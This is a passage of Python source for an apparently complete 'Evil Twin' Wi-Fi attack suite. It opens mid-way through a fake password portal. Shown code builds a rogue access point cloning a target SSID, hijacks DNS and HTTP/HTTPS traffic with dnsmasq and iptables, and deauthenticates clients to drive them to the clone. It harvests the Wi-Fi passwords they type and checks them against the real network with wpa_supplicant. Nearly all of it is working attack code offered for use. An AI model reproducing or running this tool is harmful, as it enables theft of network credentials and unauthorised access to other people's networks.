                <input type="password" id="password" name="password" 
                       required placeholder="Enter network password" 
                       minlength="8" autocomplete="off">
            </div>
            <button type="submit">Verify & Continue</button>
            <div class="progress" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </form>
        
        <div class="footer">
            <span class="secure-badge">🔒 Secure Connection</span>
        </div>
    </div>
    
    <script>
        function showProgress() {{
            document.getElementById('progress').style.display = 'block';
            let w = 0;
            const bar = document.getElementById('progressBar');
            const interval = setInterval(() => {{
                if (w >= 100) clearInterval(interval);
                else {{ w += 5; bar.style.width = w + '%'; }}
            }}, 50);
        }}
    </script>
</body>
</html>"""
    
    def _setup_ap(self):
        """Настройка точки доступа"""
        self.log_ap("Configuring Evil Twin AP...")
        
        if DEMO_MODE:
            return
        
        # Адаптивная конфигурация под цель
        channel = int(self.target['channel'])
        
        # Определяем hw_mode
        if channel <= 13:
            hw_mode = 'g'
            freq = 2407 + channel * 5
        else:
            hw_mode = 'a'
            freq = 5000 + channel * 5
        
        # Конфигурация hostapd
        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ssid={self.target['ssid']}
hw_mode={hw_mode}
channel={channel}
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
        
        # Добавляем WiFi 6 параметры если поддерживается
        if self.wifi6_info.get('supported'):
            hostapd_conf += """
ieee80211n=1
ieee80211ac=1
ieee80211ax=1
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        # Конфигурация dnsmasq
        dnsmasq_conf = f"""interface={self.ap_interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,24h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        # Настройка интерфейса
        subprocess.run(['ip', 'link', 'set', self.ap_interface, 'down'], capture_output=True)
        subprocess.run(['ip', 'addr', 'flush', 'dev', self.ap_interface], capture_output=True)
        subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.ap_interface], capture_output=True)
        subprocess.run(['ip', 'link', 'set', self.ap_interface, 'up'], capture_output=True)
        
        # IP forwarding и iptables
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
        
        subprocess.run(['iptables', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                       '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                       '--dport', '443', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'], capture_output=True)
    
    def _start_services(self):
        """Запуск сервисов"""
        self.log_ap("Starting services...")
        
        if DEMO_MODE:
            return
        
        # Apache
        subprocess.run(['systemctl', 'start', 'apache2'], capture_output=True)
        
        # Копируем портал
        subprocess.run(['cp', '-r', '/tmp/portal/', '/var/www/html/'], capture_output=True)
        
        # dnsmasq
        subprocess.Popen(
            ['dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # hostapd
        subprocess.Popen(
            ['hostapd', '/tmp/hostapd.conf'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(2)
        self.log_ap("Services started")
    
    def start_attack(self):
        """Запуск атаки"""
        self.running = True
        
        # Регистрируем callbacks
        def on_channel_change(old_ch, new_ch):
            self.log_deauth(f"Channel hop: {old_ch} -> {new_ch}")
            self.stats['channel_hops'] += 1
        
        def on_new_client(mac, info):
            self.log_deauth(f"New client: {mac} (signal: {info.get('signal', 'N/A')})")
            self.smart_deauth.add_client(mac, info)
            self.stats['clients_seen'] += 1
        
        self.channel_hopper.add_callback(on_channel_change)
        self.client_tracker.add_callback(on_new_client)
        
        # Запускаем компоненты
        self.log_deauth("Starting channel monitor...")
        self.channel_hopper.start_monitoring()
        
        self.log_deauth("Starting client tracker...")
        self.client_tracker.start()
        
        self.log_deauth("Starting smart deauth...")
        self.log_deauth(f"Strategy: {self.smart_deauth.bypass_strategy['method']}")
        self.smart_deauth.start()
        
        # Мониторинг паролей
        self._start_password_monitor()
    
    def _start_password_monitor(self):
        """Запуск мониторинга паролей"""
        def monitor():
            while self.running and not self.attack_successful:
                if DEMO_MODE:
                    time.sleep(random.randint(5, 15))
                    if not self.running:
                        break
                    
                    # Симуляция получения пароля
                    fake_passwords = ['Password123!', 'WiFi2024', 'HomeNetwork99', 'SecurePass456']
                    password = random.choice(fake_passwords)
                    ip = f"10.0.0.{random.randint(10, 200)}"
                    
                    self.log_ap(f"Client connected: {ip}")
                    self.log_ap(f"Password received: {password}")
                    self.captured_passwords.append(f"{ip}: {password}")
                    self.stats['passwords_captured'] += 1
                    
                    # Симуляция проверки
                    if len(self.captured_passwords) >= 3 or random.random() > 0.7:
                        self.log_ap(f"[SUCCESS] Password verified: {password}")
                        self.correct_password = password
                        self.attack_successful = True
                        break
                    else:
                        self.log_ap("Password incorrect, continuing...")
                    
                    continue
                
                # Реальный мониторинг
                try:
                    pwd_file = '/tmp/evil_twin_passwords.txt'
                    if os.path.exists(pwd_file):
                        with open(pwd_file, 'r') as f:
                            lines = f.readlines()
                        
                        for line in lines[len(self.captured_passwords):]:
                            try:
                                data = json.loads(line.strip())
                                password = data.get('password', '')
                                ip = data.get('ip', 'unknown')
                                
                                self.log_ap(f"Client: {ip}")
                                self.log_ap(f"Password: {password}")
                                self.captured_passwords.append(f"{ip}: {password}")
                                self.stats['passwords_captured'] += 1
                                
                                # Верификация пароля
                                if self._verify_password(password):
                                    self.log_ap(f"[SUCCESS] Password verified!")
                                    self.correct_password = password
                                    self.attack_successful = True
                                    break
                                else:
                                    self.log_ap("Password incorrect")
                                    
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    pass
                
                time.sleep(1)
        
        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()
    
    def _verify_password(self, password: str) -> bool:
        """Проверка пароля"""
        if DEMO_MODE:
            return random.random() > 0.6
        
        # Останавливаем деаутентификацию на время проверки
        self.smart_deauth.stop()
        self.log_ap("Stopping deauth for verification...")
        
        try:
            # Создаем wpa_supplicant конфиг
            wpa_conf = f"""network={{
    ssid="{self.target['ssid']}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}"""
            
            with open('/tmp/wpa_verify.conf', 'w') as f:
                f.write(wpa_conf)
            
            # Пробуем подключиться
            # Отключаем monitor mode временно
            base_iface = self.deauth_interface.replace('mon', '')
            
            proc = subprocess.Popen(
                ['wpa_supplicant', '-i', base_iface, '-c', '/tmp/wpa_verify.conf'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Ждём результат
            time.sleep(8)
            
            # Проверяем статус
            result = subprocess.run(['wpa_cli', '-i', base_iface, 'status'],
                                  capture_output=True, text=True)
            
            proc.terminate()
            
            if 'COMPLETED' in result.stdout:
                return True
            
        except Exception:
            pass
        finally:
            # Возобновляем деаутентификацию
            self.log_ap("Resuming deauth...")
            self.smart_deauth.start()
        
        return False
    
    def stop_attack(self):
        """Остановка атаки"""
        self.running = False
        
        self.log_ap("Stopping attack...")
        
        self.smart_deauth.stop()
        self.client_tracker.stop()
        self.channel_hopper.stop_monitoring()
        
        if not DEMO_MODE:
            subprocess.run(['killall', 'hostapd'], capture_output=True)
            subprocess.run(['killall', 'dnsmasq'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
    
    def get_stats(self) -> dict:
        """Получить статистику атаки"""
        return {
            **self.stats,
            'deauth_sent': self.smart_deauth.deauth_stats['sent'],
            'current_channel': self.channel_hopper.current_channel,
            'band': self.channel_hopper.band,
            'predicted_channel': self.channel_hopper.predicted_next_channel,
            'wifi6_target': self.wifi6_info.get('supported', False),
            'pmf_enabled': self.pmf_info.get('enabled', False),
            'bypass_method': self.smart_deauth.bypass_strategy['method']
        }


# ============= ОСНОВНЫЕ КЛАССЫ ИНТЕРФЕЙСА =============

class NetworkInterface:
    """Управление сетевыми интерфейсами"""
    
    @staticmethod
    def get_interfaces() -> List[str]:
        """Получить список Wi-Fi интерфейсов"""
        if DEMO_MODE:
            return ['wlan0', 'wlan1']
        
        interfaces = []
        
        try:
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.strip().split()[-1]
                    if iface and iface not in interfaces:
                        interfaces.append(iface)
        except Exception:
            pass
        
        if not interfaces:
            try:
                result = subprocess.run(['iwconfig'], 
                                      capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        parts = line.strip().split()
                        if parts:
                            iface = parts[0]
                            if iface not in interfaces:
                                interfaces.append(iface)
            except Exception:
                pass
        
        return interfaces
    
    @staticmethod
    def is_monitor_mode(interface: str) -> bool:
        """Проверка режима монитора"""
        if DEMO_MODE:
            return 'mon' in interface
        
        try:
            result = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, text=True)
            return 'Mode:Monitor' in result.stdout
        except Exception:
            return False
    
    @staticmethod
    def enable_monitor_mode(interface: str) -> bool:
        """Включить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Enabling monitor mode on {interface}...{Colors.RESET}")
            time.sleep(1)
            return True
        
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['iw', interface, 'set', 'monitor', 'none'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            
            # Альтернативно через airmon-ng
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=10)
            
            time.sleep(2)
            return True
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error: {e}{Colors.RESET}")
            return False
    
    @staticmethod
    def disable_monitor_mode(interface: str) -> bool:
        """Выключить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Disabling monitor mode...{Colors.RESET}")
            return True
        
        try:
            subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True, timeout=10)
            time.sleep(2)
            return True
        except Exception:
            return False


class APScanner:
    """Сканер точек доступа с поддержкой WiFi 6"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks: List[dict] = []
        self.process = None
    
    def scan(self) -> List[dict]:
        """Запуск сканирования"""
        if DEMO_MODE:
            return self._demo_scan()
        
        print(f"\n{Colors.ORANGE}[*] Scanning on {self.interface}...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        
        temp_file = f"/tmp/scan_{int(time.time())}"
        
        try:
            self.process = subprocess.Popen(
                ['airodump-ng', '--write', temp_file, '--write-interval', '1',
                 '--output-format', 'csv', '--band', 'abg', self.interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            start_time = time.time()
            while time.time() - start_time < 30:
                csv_file = f"{temp_file}-01.csv"
                if os.path.exists(csv_file):
                    self.networks = self._parse_csv(csv_file)
                    self._display_networks()
                time.sleep(1)
                
        except KeyboardInterrupt:
            pass
        finally:
            if self.process:
                self.process.terminate()
            # Cleanup
            for f in os.listdir('/tmp'):
                if f.startswith(os.path.basename(temp_file)):
                    try:
                        os.remove(os.path.join('/tmp', f))
                    except:
                        pass
        
        return self.networks
    
    def _demo_scan(self) -> List[dict]:
        """Демо сканирование"""
        print(f"\n{Colors.ORANGE}[DEMO] Scanning networks...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        
        fake_networks = [
            {'bssid': 'AA:BB:CC:11:22:33', 'channel': '6', 'power': '-42', 
             'encryption': 'WPA2', 'ssid': 'HomeNetwork_5G', 'wifi6': True},
            {'bssid': 'AA:BB:CC:44:55:66', 'channel': '36', 'power': '-55', 
             'encryption': 'WPA3', 'ssid': 'Office_WiFi6', 'wifi6': True},
            {'bssid': 'AA:BB:CC:77:88:99', 'channel': '1', 'power': '-68', 
             'encryption': 'WPA2', 'ssid': 'Guest_Network', 'wifi6': False},
            {'bssid': 'DD:EE:FF:11:22:33', 'channel': '11', 'power': '-71', 
             'encryption': 'WPA2', 'ssid': 'TP-Link_Archer', 'wifi6': True},
            {'bssid': 'DD:EE:FF:44:55:66', 'channel': '149', 'power': '-58', 
             'encryption': 'WPA2', 'ssid': 'NETGEAR_5G_Gaming', 'wifi6': True},
        ]
        
        try:
            for i in range(10):
                if i < len(fake_networks):
                    self.networks.append(fake_networks[i])
                self._display_networks()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        
        return self.networks
    
    def _parse_csv(self, csv_file: str) -> List[dict]:
        """Парсинг CSV файла"""
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            in_ap_section = False
            for line in lines:
                if 'BSSID' in line and 'First time seen' in line:
                    in_ap_section = True
                    continue
                if 'Station MAC' in line:
                    break
                if in_ap_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        enc = parts[5].strip()
                        ssid = parts[13].strip()
                        
                        if bssid:
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'encryption': enc,
                                'ssid': ssid if ssid else '<Hidden>',
                                'wifi6': False  # Будет определено позже
                            })
        except Exception:
            pass
        
        return networks
    
    def _display_networks(self):
        """Отображение найденных сетей"""
        os.system('clear')
        print(f"\n{Colors.ORANGE}[*] Found: {len(self.networks)} networks{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*90)}")
        print(f"{'#':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'WiFi6':^6} {'SSID':<35}")
        print(f"{Colors.gradient('-'*90)}")
        
        for i, net in enumerate(self.networks[:20], 1):
            color = Colors.WHITE if int(net['power']) > -70 else Colors.DIM
            wifi6_tag = f"{Colors.CYAN}[AX]{Colors.RESET}" if net.get('wifi6') else "    "
            print(f"{color}{i:>3} {net['bssid']:^17} {net['channel']:^4} "
                  f"{net['power']:^5} {net['encryption']:^8} {wifi6_tag} {net['ssid']:<35}{Colors.RESET}")


# ============= ГЛАВНОЕ МЕНЮ =============

def main_menu():
    """Главное меню"""
    while True:
        os.system('clear')
        
        banner = """
 ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
 ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
 █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
 ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
 ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
 ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
                                                            v2.0
        Modern Wi-Fi Attack Suite
        WiFi 6 | PMF Bypass | Channel Hopping | Smart Deauth
"""
        print(Colors.gradient(banner, style='claude'))
        
        if DEMO_MODE:
            print(f"{Colors.YELLOW}{'[DEMO MODE]':^65}{Colors.RESET}\n")
        
        # Адаптеры
        interfaces = NetworkInterface.get_interfaces()
        print(f"{Colors.ORANGE}[*] Wi-Fi Adapters:{Colors.RESET}\n")
        
        if not interfaces:
            print(f"  {Colors.ORANGE}[!] No adapters found{Colors.RESET}")
        else:
            for i, iface in enumerate(interfaces, 1):
                mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
                mode_color = Colors.GREEN if mode == "Monitor" else Colors.WHITE
                print(f"  {Colors.WHITE}[{i}] {iface:12} {mode_color}[{mode}]{Colors.RESET}")
        
        # Режимы
        print(f"\n{Colors.gradient('─'*60)}")
        
        modes = []
        if AGGRESSIVE_MODE:
            modes.append("AGGRESSIVE")
        if STEALTH_MODE:
            modes.append("STEALTH")
        if WIFI6_MODE:
            modes.append("WiFi6")
        
        if modes:
            print(f"{Colors.CYAN}Active modes: {', '.join(modes)}{Colors.RESET}")
        
        print(f"\n{Colors.ORANGE}[1]{Colors.WHITE} Modern Evil Twin Attack{Colors.RESET}")
        print(f"{Colors.ORANGE}[2]{Colors.WHITE} Quick Scan{Colors.RESET}")
        print(f"{Colors.ORANGE}[3]{Colors.WHITE} Disable All Monitor Modes{Colors.RESET}")
        print(f"{Colors.ORANGE}[0]{Colors.WHITE} Exit{Colors.RESET}")
        print(f"\n{Colors.gradient('─'*60)}\n")
        
        choice = input(f"{Colors.WHITE}Select: {Colors.RESET}")
        
        if choice == '1':
            modern_evil_twin_menu()
        elif choice == '2':
            quick_scan_menu()
        elif choice == '3':
            print(f"\n{Colors.ORANGE}[*] Disabling monitor mode...{Colors.RESET}")
            for iface in interfaces:
                NetworkInterface.disable_monitor_mode(iface)
            print(f"{Colors.WHITE}[✓] Done{Colors.RESET}")
            time.sleep(2)
        elif choice == '0':
            print(f"\n{Colors.ORANGE}[*] Exiting...{Colors.RESET}")
            sys.exit(0)


def quick_scan_menu():
    """Быстрое сканирование"""
    interfaces = NetworkInterface.get_interfaces()
    
    if not interfaces:
        print(f"\n{Colors.ORANGE}[!] No adapters{Colors.RESET}")
        time.sleep(2)
        return
    
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Select adapter for scanning:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {Colors.WHITE}[{i}] {iface}{Colors.RESET}")
    
    choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
    
    try:
        interface = interfaces[int(choice) - 1]
    except:
        return
    
    # Включаем monitor mode если нужно
    if not NetworkInterface.is_monitor_mode(interface):
        print(f"\n{Colors.ORANGE}[*] Enabling monitor mode...{Colors.RESET}")
        NetworkInterface.enable_monitor_mode(interface)
        interface = interface + 'mon' if not interface.endswith('mon') else interface
    
    scanner = APScanner(interface)
    scanner.scan()
    
    input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")


def modern_evil_twin_menu():
    """Меню современной Evil Twin атаки"""
    interfaces = NetworkInterface.get_interfaces()
    
    if len(interfaces) < 2:
        os.system('clear')
        print(f"\n{Colors.ORANGE}[!] Need at least 2 Wi-Fi adapters!{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Found: {len(interfaces)}{Colors.RESET}")
        print(f"\n{Colors.DIM}One adapter for Evil Twin AP, another for deauth{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to return...{Colors.RESET}")
        return
    
    # Выбор адаптера для AP
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Select adapter for Evil Twin AP:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
        print(f"  {Colors.WHITE}[{i}] {iface} [{mode}]{Colors.RESET}")
    
    ap_choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
    try:
        ap_interface = interfaces[int(ap_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Invalid choice{Colors.RESET}")
        time.sleep(2)
        return
    
    # Выбор адаптера для деаутентификации
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Select adapter for deauthentication:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        if iface != ap_interface:
            mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
            print(f"  {Colors.WHITE}[{i}] {iface} [{mode}]{Colors.RESET}")
    
    deauth_choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
    try:
        deauth_interface = interfaces[int(deauth_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Invalid choice{Colors.RESET}")
        time.sleep(2)
        return
    
    if ap_interface == deauth_interface:
        print(f"{Colors.ORANGE}[!] Adapters must be different!{Colors.RESET}")
        time.sleep(2)
        return
    
    # Включаем monitor mode на deauth интерфейсе
    if not NetworkInterface.is_monitor_mode(deauth_interface):
        print(f"\n{Colors.ORANGE}[*] Enabling monitor mode on {deauth_interface}...{Colors.RESET}")
        NetworkInterface.enable_monitor_mode(deauth_interface)
        if not deauth_interface.endswith('mon'):
            deauth_interface += 'mon'
        time.sleep(2)
    
    # Сканирование
    print(f"\n{Colors.ORANGE}[*] Starting network scan...{Colors.RESET}")
    scanner = APScanner(deauth_interface)
    
    try:
        networks = scanner.scan()
    except KeyboardInterrupt:
        networks = scanner.networks
    
    if not networks:
        print(f"\n{Colors.ORANGE}[!] No networks found{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to return...{Colors.RESET}")
        return
    
    # Выбор цели
    print(f"\n{Colors.WHITE}Enter target number: {Colors.RESET}", end='')
    target_choice = input()
    
    try:
        target = networks[int(target_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Invalid choice{Colors.RESET}")
        time.sleep(2)
        return
    
    # Запуск атаки
    os.system('clear')
    print(f"\n{Colors.gradient('='*70, style='claude')}")
    print(f"{Colors.ORANGE}{'MODERN EVIL TWIN ATTACK':^70}{Colors.RESET}")
    print(f"{Colors.gradient('='*70, style='claude')}\n")
    
    print(f"{Colors.WHITE}Target:{Colors.RESET}")
    print(f"  SSID:       {Colors.CYAN}{target['ssid']}{Colors.RESET}")
    print(f"  BSSID:      {target['bssid']}")
    print(f"  Channel:    {target['channel']}")
    print(f"  Encryption: {target['encryption']}")
    if target.get('wifi6'):
        print(f"  WiFi 6:     {Colors.GREEN}Yes{Colors.RESET}")
    print()
    
    print(f"{Colors.WHITE}Interfaces:{Colors.RESET}")
    print(f"  AP:         {ap_interface}")
    print(f"  Deauth:     {deauth_interface}")
    print()
    
    confirm = input(f"{Colors.ORANGE}Start attack? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        return
    
    # Создаём и запускаем атаку
    attack = ModernEvilTwin(ap_interface, deauth_interface, target)
    
    print(f"\n{Colors.ORANGE}[*] Initializing attack...{Colors.RESET}\n")
    attack.setup()
    
    print(f"{Colors.ORANGE}[*] Starting attack components...{Colors.RESET}\n")
    attack.start_attack()
    
    # Основной цикл отображения
    animation_frame = 0
    
    try:
        while not attack.attack_successful:
            os.system('clear')
            
            # Получаем размер терминала
            try:
                term_size = os.get_terminal_size()
                width = term_size.columns
                height = term_size.lines
            except:
                width = 120
                height = 30
            
            # Заголовок
            print(f"\n{Colors.gradient('='*width, style='claude')}")
            
            status_text = "ATTACK IN PROGRESS"
            if attack.attack_successful:
                status_text = "PASSWORD CAPTURED!"
            
            print(f"{Colors.ORANGE}{status_text:^{width}}{Colors.RESET}")
            print(f"{Colors.gradient('='*width, style='claude')}\n")
            
            # Статистика
            stats = attack.get_stats()
            
            stat_line = (f"  Channel: {Colors.CYAN}{stats['current_channel']}{Colors.RESET} "
                        f"({stats['band']}) | "
                        f"Hops: {Colors.YELLOW}{stats['channel_hops']}{Colors.RESET} | "
                        f"Clients: {Colors.GREEN}{stats['clients_seen']}{Colors.RESET} | "
                        f"Deauth: {Colors.ORANGE}{stats['deauth_sent']}{Colors.RESET} | "
                        f"Passwords: {Colors.CYAN}{stats['passwords_captured']}{Colors.RESET}")
            
            print(stat_line)
            
            if stats.get('predicted_channel'):
                print(f"  {Colors.DIM}Predicted next channel: {stats['predicted_channel']}{Colors.RESET}")
            
            if stats.get('wifi6_target'):
                print(f"  {Colors.CYAN}[WiFi 6 Target]{Colors.RESET} ", end='')
            if stats.get('pmf_enabled'):
                print(f"{Colors.YELLOW}[PMF Active]{Colors.RESET} ", end='')
            print(f"{Colors.DIM}Method: {stats.get('bypass_method', 'standard')}{Colors.RESET}")
            
            print()
            
            # Вычисляем размеры боксов
            box_width = (width - 4) // 2
            log_height = min(height - 15, 15)
            
            # Заголовки логов
            print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
            print(f"  {Colors.WHITE}{'DEAUTH LOG':^{box_width}}{Colors.RESET}   {Colors.WHITE}{'AP LOG':^{box_width}}{Colors.RESET}")
            print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
            
            # Логи
            for i in range(log_height):
                # Deauth log
                deauth_idx = len(attack.deauth_log) - log_height + i
                if 0 <= deauth_idx < len(attack.deauth_log):
                    deauth_line = attack.deauth_log[deauth_idx]
                    if len(deauth_line) > box_width - 2:
                        deauth_line = deauth_line[:box_width - 5] + "..."
                else:
                    deauth_line = ""
                
                # AP log
                ap_idx = len(attack.ap_log) - log_height + i
                if 0 <= ap_idx < len(attack.ap_log):
                    ap_line = attack.ap_log[ap_idx]
                    if len(ap_line) > box_width - 2:
                        ap_line = ap_line[:box_width - 5] + "..."
                else:
                    ap_line = ""
                
                # Подсветка важных сообщений
                if 'SUCCESS' in ap_line or 'PASSWORD' in ap_line.upper():
                    ap_line = f"{Colors.GREEN}{ap_line}{Colors.RESET}"
                elif 'incorrect' in ap_line.lower():
                    ap_line = f"{Colors.ORANGE}{ap_line}{Colors.RESET}"
                
                if 'hop' in deauth_line.lower():
                    deauth_line = f"{Colors.YELLOW}{deauth_line}{Colors.RESET}"
                elif 'client' in deauth_line.lower():
                    deauth_line = f"{Colors.CYAN}{deauth_line}{Colors.RESET}"
                
                print(f"  {deauth_line:<{box_width}}   {ap_line:<{box_width}}")
            
            print(f"\n  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
            
            # Статус с анимацией
            status_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
            spinner = status_chars[animation_frame % len(status_chars)]
            
            print(f"\n  {Colors.animate_gradient(f'{spinner} Attacking... Press Ctrl+C to stop', animation_frame)}")
            
            animation_frame += 1
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        pass
    
    # Остановка атаки
    print(f"\n\n{Colors.ORANGE}[*] Stopping attack...{Colors.RESET}")
    attack.stop_attack()
    
    # Результаты
    show_attack_results(attack, target)


def show_attack_results(attack: ModernEvilTwin, target: dict):
    """Показать результаты атаки"""
    os.system('clear')
    
    stats = attack.get_stats()
    
    print(f"\n{Colors.gradient('='*80, style='claude')}")
    print(f"{Colors.ORANGE}{'ATTACK RESULTS':^80}{Colors.RESET}")
    print(f"{Colors.gradient('='*80, style='claude')}\n")
    
    # Информация о цели
    print(f"{Colors.WHITE}Target Information:{Colors.RESET}")
    print(f"  SSID:         {Colors.CYAN}{target['ssid']}{Colors.RESET}")
    print(f"  BSSID:        {target['bssid']}")
    print(f"  Channel:      {target['channel']} ({stats['band']})")
    print(f"  Encryption:   {target['encryption']}")
    
    if stats.get('wifi6_target'):
        print(f"  WiFi 6:       {Colors.GREEN}Yes{Colors.RESET}")
    if stats.get('pmf_enabled'):
        print(f"  PMF:          {Colors.YELLOW}Enabled{Colors.RESET}")
        print(f"  Bypass:       {stats.get('bypass_method', 'N/A')}")
    
    print()
    
    # Результат
    if attack.attack_successful and attack.correct_password:
        print(f"{Colors.gradient('╭' + '─' * 76 + '╮', style='claude')}")
        print(f"{Colors.GREEN}│{'SUCCESS! PASSWORD CAPTURED':^76}│{Colors.RESET}")
        print(f"{Colors.gradient('├' + '─' * 76 + '┤', style='claude')}")
        print(f"{Colors.WHITE}│  Password: {Colors.CYAN}{attack.correct_password}{Colors.RESET}{' ' * (63 - len(attack.correct_password))}│")
        print(f"{Colors.gradient('╰' + '─' * 76 + '╯', style='claude')}")
        
        # Сохраняем в файл
        result_file = f"/tmp/captured_{target['ssid'].replace(' ', '_')}_{int(time.time())}.txt"
        try:
            with open(result_file, 'w') as f:
                f.write(f"SSID: {target['ssid']}\n")
                f.write(f"BSSID: {target['bssid']}\n")
                f.write(f"Password: {attack.correct_password}\n")
                f.write(f"Captured: {datetime.now().isoformat()}\n")
            print(f"\n{Colors.DIM}Saved to: {result_file}{Colors.RESET}")
        except:
            pass
    else:
        print(f"{Colors.ORANGE}Status: Attack stopped (no valid password captured){Colors.RESET}")
    
    print()
    
    # Статистика
    print(f"{Colors.WHITE}Statistics:{Colors.RESET}")
    print(f"  Channel hops detected:  {Colors.YELLOW}{stats['channel_hops']}{Colors.RESET}")
    print(f"  Clients discovered:     {Colors.GREEN}{stats['clients_seen']}{Colors.RESET}")
    print(f"  Deauth packets sent:    {Colors.ORANGE}{stats['deauth_sent']}{Colors.RESET}")
    print(f"  Passwords captured:     {Colors.CYAN}{stats['passwords_captured']}{Colors.RESET}")
    
    print()
    
    # Все перехваченные пароли
    if attack.captured_passwords:
        print(f"{Colors.WHITE}All Captured Attempts:{Colors.RESET}")
        for i, pwd in enumerate(attack.captured_passwords[:15], 1):
            verified = "✓" if attack.correct_password and attack.correct_password in pwd else "✗"
            color = Colors.GREEN if verified == "✓" else Colors.DIM
            print(f"  {color}[{i}] {pwd} [{verified}]{Colors.RESET}")
        
        if len(attack.captured_passwords) > 15:
